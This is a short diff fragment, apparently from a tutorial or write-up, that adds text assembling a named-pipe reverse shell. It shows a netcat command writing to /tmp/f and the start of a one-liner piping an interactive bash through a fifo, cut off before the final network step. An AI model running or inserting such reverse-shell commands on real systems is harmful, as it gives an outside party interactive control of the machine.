@@ -62,3 +62,7 @@ cat /tmp/f |
 ```bash
 nc -l 10.10.10.10 7777 > /tmp/f
 ```
+so the whole thing becomes
+```bash
+rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1 | 
+```
